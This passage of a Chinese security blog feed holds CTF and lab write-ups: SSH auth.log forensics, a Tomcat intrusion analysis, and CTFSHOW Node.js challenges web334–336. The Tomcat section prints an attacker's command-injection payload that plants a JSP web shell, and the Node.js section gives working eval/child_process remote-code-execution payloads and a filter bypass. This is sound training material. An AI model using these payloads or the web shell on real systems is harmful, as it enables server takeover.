账户远程登录</li><li>配置登录超时时间、日志级别、安全策略等</li><li>控制哪些用户或用户组可以通过SSH登录</li></ul><p>查看<code>/etc/ssh/sshd_config</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819132115717.png"></p><p>在最下面那里可以看到只允许<code>SSHD_USER</code>用户组和<code>root</code>用户组进行ssh登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250819132728634.png"></p><p>然后在<code>/etc/group</code>筛选出这两个组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;^(root|SSHD_USER):&#x27;</span> /etc/group</span><br></pre></td></tr></table></figure><p>这个命令的意思是：</p><ul><li><code>-E</code> 参数表示启用扩展正则表达式，支持更多高级符号和语法，如“|”表示或、“()”用于分组、“+”表示重复等，使表达式更简洁易读，匹配功能更强大</li><li><code>^(root|SSHD_USER):</code> 表示匹配以“root:”或“SSHD_USER:”开头的行</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250819133240938.png"></p><p>root组后面为空，表示这个组<strong>没有附加用户</strong>（也就是没有把别的用户名手动加进组内），默认为root。然后<code>SSHD_USER</code>组有两个用户，分别为toor和root，去重之后可以登录 SSH 的账号就只有toor和root用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次）</strong></p><p><code>auth.log</code> 是Linux系统记录身份认证相关信息的日志文件，包括用户登录成功、失败、ssh连接、公钥认证和使用sudo等操作的记录。它帮助管理员监控登录情况和发现安全问题，是安全审计的重要依据</p><p>其中<code>auth.log</code>表示最新日志，<code>auth.log.1</code>表示上一轮未压缩归档，<code>auth.log.N.gz</code>表示更早的归档（N为数字）</p><p>进入log日志文件夹，查看当前目录文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log &amp;&amp; <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819134348847.png"></p><p>我们要分析的是<strong>已归档文件</strong>，也就是<code>auth.log.1</code>和<code>auth.log.2.gz</code></p><p>先解压<code>auth.log.2.gz</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d auth.log.2.gz</span><br></pre></td></tr></table></figure><p>用<code>gzip</code>命令解压后，会删除原本的<code>.gz</code>压缩文件，并生成新的文件</p><p>然后筛选出包含<code>Accepted password</code>或<code>Accepted publickey</code>的日志记录即可</p><ul><li><strong>Accepted password</strong>：表示通过密码验证成功登录</li><li><strong>Accepted publickey</strong>：表示通过公钥认证成功登录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&quot;Accepted password|Accepted publickey&quot;</span> auth.log.1 auth.log.2 | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819141505256.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;103&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>SSH日志中登录成功次数最多的用户的用户名是什么</strong></p><p>用<code>awk</code>筛选登录成功的日志记录即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&quot;Accepted password|Accepted publickey&quot;</span> auth.log.1 auth.log.2 | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819141749276.png"></p><p>可以看到SSH日志中登录成功次数最多的用户名是toor</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;toor&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag{用户名,ip})</strong></p><p>直接筛选出包含<code>Failed password</code>或<code>Failed publickey</code>的记录，然后<code>awk</code>查看用户名和IP地址即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&quot;Failed password|Failed publickey&quot;</span> auth.log.1 auth.log.2 | awk <span class="string">&#x27;&#123;print $9, $(NF-3)&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure><ul><li><code>awk &#39;&#123;print $9, $(NF-3)&#125;&#39;</code> 表示打印第9列（用户名）和倒数第4列（登录来源IP，通常日志中IP在倒数第4列）</li><li><code>sort</code> 对结果进行排序</li><li><code>uniq -c</code> 统计相同用户名和IP的出现次数</li><li><code>sort -n</code> 表示按照 <strong>数字大小</strong> 进行排序，而不是按字母ASCII顺序</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/image-20250819142357642.png"></p><p>可以看到SSH日志中登录失败次数最多的用户是root，登录使用的ip是<code>87.163.111.11</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;root,87.163.111.11&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">日志分析-ssh日志分析详解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 日志分析-Tomcat日志分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Tomcat-Log-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Tomcat-Log-Analysis/</id>
    <published>2025-08-16T10:47:39.000Z</published>
    <updated>2025-08-16T10:47:54.712Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>小王在自己的服务器上安装配置了Tomcat，并写了几个简单的网页。但由于安全意识不足，很快就被攻击者利用了。请你帮他排查一下存在的安全问题</p><p>RDP 端口3389 用户名&#x2F;密码：<strong>Administrator&#x2F;4210bf@</strong></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250816182518842.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>Tomcat日志所在的绝对路径是？</strong></p><p>首先连接目标电脑，在C盘中可以看到server目录，根据名字猜测是提供服务的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172136057.png"></p><p>点进去可以看到tomcat目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172221599.png"></p><p>打开目录文件，在里面找到logs目录，然后复制路径即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172410540.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C:\server\apache-tomcat-11.0.5\logs&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>攻击者对某网站进行了口令爆破。请你判断口令成功匹配的请求的响应码是？</strong></p><p>我们打开logs目录，可以看到里面有个日志占用空间较大</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172651199.png"></p><p>打开文件进行分析，前面是攻击者在进行目录扫描，然后后面有个关键的地方</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173141689.png"></p><p>这里攻击者访问了<code>/demo/admin.jsp</code>，但是由于没有凭证随后重定向到登录界面，也就是<code>login.jsp</code>，接着就开始对网站进行口令爆破</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173415379.png"></p><p>可以看到，在经历了大量了爆破之后也是成功登入了系统，状态码显示302，然后跳转到<code>/demo/admin.jsp</code></p><p>因此判断口令成功匹配的响应码就是302</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;302&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>请你判断其服务器上用于盗取cookie而监听的端口是？</strong></p><p>题目描述：攻击者向admin.jsp的管理员留言板界面发送了恶意JS代码从而构成了存储型XSS。已知攻击者试图盗取管理员cookie，并将其发送至其本地服务器上。</p><p>题目提示攻击者向<code>admin.jsp</code>发送恶意代码，结合前面的日志，我们可知该文件位于<code>/demo</code>目录里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173826280.png"></p><p>里面有个<code>messages.txt</code>，打开后可以看到里面存储了管理员留言板接收到的信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173943320.png"></p><p>这个js语句就是攻击者用来窃取管理员cookie的，因此用来监听的端口就是5000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5000&#125;</span><br></pre></td></tr></table></figure><p>接下来我们分析一下<code>admin.jsp</code>中的漏洞代码，里面有个代码片段用于显示留言</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;所有留言&lt;/h2&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;% <span class="keyword">if</span> (messages != <span class="literal">null</span> &amp;&amp; !messages.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String message : messages) &#123;</span><br><span class="line">    %&gt;</span><br><span class="line">        &lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; %&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>其中关键就是<code>&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;</code>，它使用了 JSP 的表达式 <code>&lt;%= ... %&gt;</code> 直接将从文件中读取的 <code>message</code> 字符串<strong>未经任何处理</strong>就输出到 HTML 页面上</p><p>攻击者提交的留言内容会原封不动地保存到<code>messages.txt</code> 文件里，浏览器在解析 HTML 时，会把 <code>&lt;script&gt;</code> 标签当作可执行代码来运行，从而触发XSS漏洞</p><p>修复建议就是对输出的 <code>message</code> 变量进行<strong>HTML 实体编码</strong></p><p><strong>修复前：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><strong>修复后：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.lang3.StringEscapeUtils&quot;</span> %&gt;</span><br><span class="line"><span class="comment">// ...    </span></span><br><span class="line">&lt;li&gt;&lt;%= StringEscapeUtils.escapeHtml4(message) %&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>或者<strong>使用JSTL标签库</strong></p><p>首先在JSP页面顶部引入JSTL核心标签库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>然后使用 <code>&lt;c:out&gt;</code> 标签来输出内容，它默认就会进行HTML编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;message&quot;</span> items=<span class="string">&quot;$&#123;messages&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;li&gt;&lt;c:out value=<span class="string">&quot;$&#123;message&#125;&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>攻击者利用执行系统命令的参数是？</strong></p><p>回到刚才的log日志，在最下面可以看到有个文件传递了系统命令内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174224670.png"></p><p>该文件原本可能是用于接收IP地址并执行网络命令的（如 <code>ping</code> 或 <code>traceroute</code>），攻击者没有输入一个正常的IP地址，而是通过命令连接符 <code>&amp;&amp;</code> 执行系统命令，因此参数就是<code>ip</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ip&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者通过某种手段遗留了后门文件，请你找到该文件并按需提交其文件中的flag</strong></p><p>同样也是刚才的日志文件，看最下面那行的参数内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=8.8.8.8+%26%26+echo+%5E%3C%25%40+page+language%3D%22java%22+import%3D%22java.util.*%2Cjava.io.*%22+%25%5E%3E%5E%3C%25+String+cmd+%3D+request.getParameter%28%22cmd%22%29%3B+if+%28cmd+%21%3D+null%29+%7B+Process+p+%3D+Runtime.getRuntime%28%29.exec%28cmd%29%3B+BufferedReader+reader+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B+String+line%3B+while+%28%28line+%3D+reader.readLine%28%29%29+%21%3D+null%29+%7B+out.println%28line+%2B+%22%5E%3Cbr%5E%3E%22%29%3B+%7D+%7D+%25%5E%3E+%3E+C%3A%5Cserver%5Capache-tomcat-11.0.5%5Cwebapps%5CROOT%5Chello.jsp HTTP/1.1&quot; 200 1349</span><br></pre></td></tr></table></figure><p><strong>URL解码</strong>，查看原始内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174427405.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=8.8.8.8 &amp;&amp; echo ^&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %^&gt;^&lt;% String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) &#123; out.println(line + &quot;^&lt;br^&gt;&quot;); &#125; &#125; %^&gt; &gt; C:\server\apache-tomcat-11.0.5\webapps\ROOT\hello.jsp HTTP/1.1&quot; 200 1349</span><br></pre></td></tr></table></figure><p>可以看到攻击者把代码写进了<code>C:\server\apache-tomcat-11.0.5\webapps\ROOT\hello.jsp</code></p><p>我们简单分析这个后门代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 从URL请求中获取名为 &quot;cmd&quot; 的参数</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="comment">// 如果 &quot;cmd&quot; 参数存在</span></span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 在服务器上执行该参数的值作为一个系统命令</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">// 读取该命令执行后的输出结果</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="comment">// 将输出结果逐行打印到网页上</span></span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            out.println(line + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>文件上传后，攻击者只需要访问<code>/hello.jsp?cmd=</code>即可执行系统命令</p><p>我们找到这个文件，查看里面的内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174619541.png"></p><p>可以看到里面有个注释写了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* 疑似flag? eW91bWFkZWl0 */</span><br></pre></td></tr></table></figure><p>但是如果直接提交的话是不行的，需要进行<strong>base64解码</strong>后再提交</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174729153.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;youmadeit&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">日志分析-Tomcat日志分析详解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | nodejs题解 web334 - web344</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/</id>
    <published>2025-08-14T02:45:39.000Z</published>
    <updated>2025-08-14T03:08:27.270Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是nodejs"><a href="#什么是nodejs" class="headerlink" title="什么是nodejs"></a>什么是nodejs</h2><p><strong>Node.js</strong> 是一个基于 Chrome V8 引擎的开源、跨平台的 <strong>JavaScript 运行环境</strong>，主要用于在服务端运行JavaScript代码。以前JavaScript大多只能在浏览器中运行，有了 Node.js，开发者可以用 JavaScript 开发后端服务端应用，比如Web服务器、命令行工具等</p><p>核心特点如下：</p><ul><li>采用 <strong>事件驱动</strong>、<strong>非阻塞式I&#x2F;O</strong>模型，使其高效、轻量，特别适合处理高并发、I&#x2F;O密集的网络应用</li><li>利用 <strong>V8 引擎</strong>，JavaScript 代码执行速度快、性能高</li><li>拥有全球最大的开源包管理生态系统—— <strong>npm</strong>，可便捷地安装和管理各种第三方模块和工具包</li><li>让前端开发者可以用同一种语言开发前后端，提高开发效率与协同</li></ul><p>Node.js 不是一门新语言，也不是JavaScript的框架，更不是Web服务器；它就是一个能在服务器端运行JavaScript的平台，类似于Java的JVM在服务器上运行Java程序</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>下载题目附件进行分析，一共就两个文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250814101654895.png"></p><p><code>user.js</code>里面写了用户账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811165358821.png"></p><p>然后<code>login.js</code>是关于登录的一些逻辑校验，其中我们需要重点关注的是<code>findUser</code>变量这里</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811165648974.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br></pre></td></tr></table></figure><p>要求名字不为CTFSHOW，但是后面有个<code>toUpperCase()</code>函数，也就是输入的用户名会变大写，那只要输入小写的<code>ctfshow</code>，经过<code>toUpperCase()</code>变大写之后就通过验证了</p><p>打开题目环境，登录框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：ctfshow</span><br><span class="line">密码：123456</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811170126699.png"></p><h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>打开题目环境，查看网页源代码，可以看到有注释提示，可以拼接进网站访问</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811221417656.png"></p><p>应该是<code>eval()</code>函数，可以用<code>child_process</code>来调用API执行系统命令</p><p><strong>什么是child_process</strong></p><p><strong>child_process</strong> 是 Node.js 的一个核心模块，用于在应用程序中创建和管理<strong>子进程</strong>，让 JavaScript 能够在服务器端执行外部命令、脚本或者进行多进程并发运算</p><p><strong>常用API</strong></p><ul><li><code>spawn()</code>：创建新进程，流方式处理数据，适合实时数据处理</li><li><code>exec()</code>：执行命令或脚本，回调方式返回所有输出，适合一次性任务</li><li><code>execFile()</code>：直接执行文件，减少命令注入风险</li><li><code>fork()</code>：专门用于启动新的 Node.js 进程，并与主进程实现 IPC（进程间通信）</li><li><code>execSync()</code>：同步执行命令，阻塞直到完成，返回结果，简洁直观</li><li><code>spawnSync()</code>：同步版本的 spawn，阻塞等待子进程完成，返回详细进程信息</li></ul><p>这题需要我们用<code>require</code>包含<code>child_process</code>模块来调用API执行命令</p><p>但是如果我们直接执行<code>exec()</code>，会返回<code>[object Object]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).exec(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811224336094.png"></p><p>这是因为<code>exec()</code>是异步执行，通过回调函数传递输出与错误，直接调用的话会返回一个 <code>ChildProcess</code> 对象，正确的方法应像下面这样</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout); <span class="comment">// 这里才是命令输出</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>而<code>execSync()</code>则是同步执行，直接返回命令执行后的输出内容（Buffer 或 String），可以直接打印数据</p><p>所以我们用<code>execSync()</code>来执行命令</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811223714875.png"></p><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811223800345.png"></p><p>当然调用<code>spawnSync()</code>也可以，不过直接打印的话它会返回一个<strong>包含多个属性的对象</strong>，需要用stdout输出Buffer，然后通过<code>toString()</code>转换为字符串，调用格式为<code>spawnSync(command, args)</code>。如果你把命令和参数写在同一个字符串里（如 <code>&#39;cat fl00g.txt&#39;</code>），<code>spawnSync</code> 会当作单一命令去执行，导致找不到该命令或执行出错，因此需要拆开</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl00g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811225627185.png"></p><h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>这题跟上题差不多，但是调用<code>execSync()</code>不行了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811231135598.png"></p><p>这里介绍两个变量，<code>__filename</code>和<code>__dirname</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__filename：获取当前模块文件的完整绝对路径文件名</span><br><span class="line">__dirname：获取当前文件所在目录的完整目录名</span><br></pre></td></tr></table></figure><p>直接在网站拼接命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__filename</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811231547821.png"></p><p>可以看到网站显示了当前文件的绝对路径<code>/app/routes/index.js</code></p><p>我们用fs模块的<code>readFileSync()</code>来读取文件，fs模块（File System 模块）是专门用于进行<strong>文件系统相关操作的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;).toString()</span><br></pre></td></tr></table></figure><p>直接爆出源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> evalstring = req.<span class="property">query</span>.<span class="property">eval</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">typeof</span>(evalstring) == <span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.<span class="title function_">search</span>(<span class="regexp">/exec|load/i</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring) &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>可以看到过滤了包含 <code>exec</code> 或 <code>load</code> 的字符串，有很多种方法可以做这题</p><p><strong>1. 字符串拼接绕过</strong></p><p>把<code>execSync</code>拆成 